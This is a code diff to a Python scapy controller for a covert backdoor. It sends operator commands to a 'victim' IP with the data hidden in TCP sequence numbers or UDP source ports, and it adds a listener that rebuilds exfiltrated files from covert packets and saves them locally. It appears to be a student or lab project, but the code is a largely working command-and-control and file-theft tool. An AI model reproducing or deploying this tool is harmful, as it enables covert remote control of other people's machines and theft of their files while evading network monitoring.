@@ -1,12 +1,13 @@
 
 #Dependancies
+from multiprocessing import Process
 from scapy.all import *
 from Crypto.Cipher import AES #PiCrypto used for encrypting commands in AES
 import uuid #Used to generate UID's
 import os # Used for executing commands on shell.
 
 #Inputs
-victimIP = "192.168.0.23"
+victimIP = "192.168.0.7"
 ttlKey = 164
 srcPort = 80
 dstPort = 8000
@@ -15,7 +16,7 @@ IV = "abcdefghijklmnop"
 protocol = "TCP"
 password = "TEST!"
 authentication = "TEST!"
-localIP = "192.168.0.22"
+localIP = "192.168.0.6"
 messages = []
 #Encrypt the message
 def encrypt(message):
@@ -138,7 +139,30 @@ def craftPacket(data,protocol,position,total,UID):
          ":"+str(total)))
     return packet
 
-def sendmessage(protocol,message):
+# def sendmessage(protocol,message):
+#     global victimIP
+#     global ttlKey
+#     global srcPort
+#     global dstPort
+#     global encryptionKey
+#     global IV
+#     #1. Encrypt the message
+# 	#message = encrypt(message)
+#     #2. Convert message to ASCII to bits
+#     message = messageToBits(message)
+#     #3. Chunk message into the size appropriate for the procol
+#     chunks = chunkMessage(message,protocol)
+#     #4. Craft packets
+#     packets = craftPackets(chunks,protocol)
+#     #5. Send the packets
+#     if(len(packets) == 1):
+#         send(packets[0], verbose=0)
+#     else:
+#         for packet in packets:
+#     		send(packet, verbose=0)
+#     		pass
+
+def sendmessage(protocol,message,type):
     global victimIP
     global ttlKey
     global srcPort
@@ -147,18 +171,22 @@ def sendmessage(protocol,message):
     global IV
     #1. Encrypt the message
 	#message = encrypt(message)
-    #2. Convert message to ASCII to bits
-    message = messageToBits(message)
+    if(type == "command"):
+        #2. Convert message to ASCII to bits
+        message = messageToBits(message)
+    elif(type == "file"):
+        #2B. Convert the message to bits
+        message = fileToBits(message)
     #3. Chunk message into the size appropriate for the procol
     chunks = chunkMessage(message,protocol)
     #4. Craft packets
     packets = craftPackets(chunks,protocol)
     #5. Send the packets
     if(len(packets) == 1):
-        send(packets[0], verbose=0)
+        send(packets[0])
     else:
         for packet in packets:
-    		send(packet, verbose=0)
+    		send(packet)
     		pass
 
 ###############################SERVER STUFF################################
@@ -312,14 +340,119 @@ def handle(packet):
                     # else:
                         #DEBUG: print "Max not reached, don't reconstruct command yet"
 
+def receiveFile(packet):
+    if(packet.haslayer(IP)):
+        if(packet[IP].src != localIP):
+            if authenticate(packet):
+                payload = decrypt(packet["Raw"].load).split("\n")
+                # print "Payload"
+                # print payload
+                UID = payload[1]
+                # print "UID is " + UID
+                position = payload[2].split(":")[0]
+                # print "Position is " + position
+                total = payload[2].split(":")[1]
+                # print "Total is " + total
 
-#Main
-# message = "iptables -L"
+                if(packet.haslayer(TCP)):
+                    #Define the length
+                    length = 32
+                    # decrypt the covert contents
+                    # print "Covert content = " + str(packet[TCP].seq)
+                    # convert to binary
+                    covertContent = bin(packet[TCP].seq)[2:].zfill(length)
+                    # print "binary is " + covertContent
+                elif(packet.haslayer(UDP)):
+                    length = 16
+                    # decrypt the covert contents
+                    # print "Covert content = " + str(packet[UDP].sport)
+                    # convert to binary
+                    covertContent = bin(packet[UDP].sport)[2:].zfill(length)
+                    # print "binary is " + covertContent
+                # If there is only 1 message for this command, reconstruct it
+                #if(total == 1):
+                    #DEBUG: print "Only one message, just reconstruct it"
+                # Else, add to an array
+                if(total != 1):
+                    #DEBUG: print "Multipart command, add to messages"
+                    addToMessages(messages, UID, total, covertContent)
+                    # After every add, check if the max has been reached
+                    if(checkCommands(UID)):
+                        #DEBUG: print "Max reached, reconstruct command"
+                        newFile = writeFile(UID)
+                        #print "HERE MUHAHAHAHAHAHA"
+                        #print "File " + str(newFile) + " has been saved"
 
-while True:
-        command = raw_input("ENTER COMMAND -> " + victimIP + ":")
-        if command =="exit":
+def writeFile(UID):
+    for element in messages:
+        # print element
+        text = ""
+        bits = ""
+        fileName = ""
+        if(element[0] == UID):
+            data = element[2]
+
+            for value in data:
+                text += str(value)
+                pass
+            # print text
+            #Split into chunks of 8
+            line = text
+            n = 8
+            chunks = [line[i:i+n] for i in range(0, len(line), n)]
+            fileBinary = [line[i:i+n] for i in range(0, len(line), n)]
+            #Convert each element in array to integer
+            for x in range(0, len(chunks)):
+                chunks[x] = int(chunks[x], 2)
+                chunks[x] = chr(chunks[x])
+
+            #Combine all the strings/messages
+            getFileName = ''.join(chunks)
+            start = getFileName.index('\n')
+            startBinary = (start*8)
+            #Split by \n
+            getFileName = getFileName.split("\n")
+            #Get the file name from the message
+            fileName = getFileName[:1]
+            #Change the lists into strings
+            fileName = ''.join(fileName)
+            fileBinary = ''.join(fileBinary)
+            #Grab just the data inside the files
+            data = fileBinary[startBinary:len(fileBinary)]
+
+            newByteArray = []
+            #grab chunks of 8 bits and store it into newByteArray
+            for i in range (0, len(data)/8):
+                newByteArray.append(int(data[i*8:(i+1) * 8], 2))
+            #change everything in newByteArray into decimal values and store into byteArray
+            byteArray = array.array('B', newByteArray).tostring()
+
+            secretMessage = bytearray(byteArray)
+        	#re-create the file
+            createFile = open("copy/" + fileName, 'wb')
+            createFile.write(secretMessage)
+
+def sniffCommand():
+    while True:
+        try:
+            command = raw_input("ENTER COMMAND: {}:".format(victimIP))
+        except EOFError as e:
+            print(e)
+        print(command)
+        # command = raw_input("ENTER COMMAND -> " + victimIP + ":")
+        if(command == "text"):
             sys.exit()
         else:
-            sendmessage("TCP",command)
+            #TODO: Change this to  ("TCP",command,"command")
+            sendmessage("TCP",command,"command")
             sniff(timeout=10, filter="ip", prn=handle)
+
+def sniffFile():
+    sniff(filter="ip and dst port 80", prn=receiveFile)
+
+if __name__ == "__main__":
+
+    fileProcess = Process(target=sniffFile)
+    fileProcess.start()
+
+    sniffCommand()
